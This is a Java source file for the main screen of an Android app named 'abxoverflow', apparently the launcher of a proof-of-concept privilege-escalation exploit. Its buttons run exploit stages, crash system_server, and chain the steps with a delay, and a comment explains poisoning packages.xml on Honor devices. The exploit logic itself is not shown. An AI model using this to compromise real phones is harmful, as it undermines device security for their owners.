package com.example.abxoverflow;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.view.View;
import android.widget.Toast;

import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void doStage1(View view) throws IOException {
        Main.stage1(this);
        Toast.makeText(this, R.string.done_toast, Toast.LENGTH_SHORT).show();
    }

    public void doStage2(View view) throws Exception {
        Main.stage2(this);
        Toast.makeText(this, R.string.done_toast, Toast.LENGTH_SHORT).show();
    }

    public void doCrash(View view) throws IOException {
        Main.crashSystemServer();
    }

    public void doEverything(View view) throws Exception {
        RebootBackgroundRunner.start(this);
        Main.stage1(this);
        // PackageInstaller must flush ~64 KiB install_sessions.xml before kill;
        // 1 s was too short on Honor (file stayed 955 B, Stage 2 could not poison packages.xml).
        Thread.sleep(5000);
        Main.crashSystemServer();
    }
}